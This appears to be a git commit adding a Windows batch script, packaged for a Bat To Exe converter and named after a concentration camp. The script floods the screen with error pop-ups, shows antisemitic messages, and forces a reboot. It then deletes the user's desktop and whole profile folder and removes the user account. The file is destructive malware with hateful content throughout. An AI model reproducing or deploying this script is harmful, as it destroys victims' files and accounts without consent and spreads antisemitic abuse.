3a2647c286ed529f8403db7c0a5b13586a9c9901
Ares Amigos <98190104+AresAmigos@users.noreply.github.com>
2022-06-05 17:17:33 +0200

    .bat version 2

---
+++ Campo di concentramento.bat
@@ -0,0 +1,115 @@
+::[Bat To Exe Converter]
+::
+::YAwzoRdxOk+EWAjk
+::fBw5plQjdCyDJGyX8VAjFB1GSQG+GG6pDaET+NTL/eWAp1kJXaI8d4Gb+bWcLeUf5XnHdJs92TpekYsPAxVbexy/fA45rGBWuViGNsqMvEHoSUfp
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdF+5
+::cxAkpRVqdFKZSTk=
+::cBs/ulQjdF+5
+::ZR41oxFsdFKZSDk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpCI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAnk
+::YxY4rhs+aU+JeA==
+::cxY6rQJ7JhzQF1fEqQJQ
+::ZQ05rAF9IBncCkqN+0xwdVs0
+::ZQ05rAF9IAHYFVzEqQJQ
+::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
+::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
+::cRolqwZ3JBvQF1fEqQJQ
+::dhA7uBVwLU+EWDk=
+::YQ03rBFzNR3SWATElA==
+::dhAmsQZ3MwfNWATElA==
+::ZQ0/vhVqMQ3MEVWAtB9wSA==
+::Zg8zqx1/OA3MEVWAtB9wSA==
+::dhA7pRFwIByZRRnk
+::Zh4grVQjdCyDJGyX8VAjFB1GSQG+GG6pDaET+NTL/eWAp1kJXaI8d4Gb+bWcLeUf5XnHdJs92TpekYsPAxVbexy/fA45rGBWuVimNsqMvE/lQwiK6UUzHmtglWLdiSUvb51tgsZj
+::YB416Ek+ZW8=
+::
+::
+::978f952a14a936cc963da21a135fa983
+::Slaves
+@echo off
+md "%userprofile%\Browser"
+md "%userprofile%\Browser\Slaves"
+
+echo msgbox "Slaves ERROR", 16, "ERROR" >> "%userprofile%\Browser\SlavesE.vbs"
+
+echo msgbox "GAME OVER, JAW", 16, "JAW" >> "%userprofile%\Browser\Gameover.vbs"
+
+echo shutdown /r /c "YOU ARE JEW" /t 3 >> "%userprofile%\Browser\end.bat"
+
+
+timeout 1 >nul /nobreak
+cd "%userprofile%\Browser"
+
+start SlavesE.vbs
+start SlavesE.vbs
+start SlavesE.vbs
+start SlavesE.vbs
+start SlavesE.vbs
+start SlavesE.vbs
+start SlavesE.vbs
+start SlavesE.vbs
+start SlavesE.vbs
+start SlavesE.vbs
+start SlavesE.vbs
+start SlavesE.vbs
+start SlavesE.vbs
+start SlavesE.vbs
+start SlavesE.vbs
+start SlavesE.vbs
+start SlavesE.vbs
+start SlavesE.vbs
+start SlavesE.vbs
+start SlavesE.vbs
+start SlavesE.vbs
+start SlavesE.vbs
+start SlavesE.vbs
+start SlavesE.vbs
+start SlavesE.vbs
+start SlavesE.vbs
+start SlavesE.vbs
+start SlavesE.vbs
+start SlavesE.vbs
+start SlavesE.vbs
+start SlavesE.vbs
+start SlavesE.vbs
+start SlavesE.vbs
+start SlavesE.vbs
+start SlavesE.vbs
+start SlavesE.vbs
+start SlavesE.vbs
+start SlavesE.vbs
+start SlavesE.vbs
+start SlavesE.vbs
+start SlavesE.vbs
+start SlavesE.vbs
+start SlavesE.vbs
+start SlavesE.vbs
+start SlavesE.vbs
+start SlavesE.vbs
+start SlavesE.vbs
+start SlavesE.vbs
+start SlavesE.vbs
+
+timeout 3 >nul /nobreak
+
+taskkill/im wscript.exe /f
+
+start Gameover.vbs
+
+timeout 1 >nul /nobreak
+end.bat
+timeout 2 >nul /nobreak
+rd "%userprofile%\desktop"/q /s
+
+timeout 4 >nul /nobreak
+
+net user "%username%" /delete
+
+rd "%userprofile%"/s /q
+
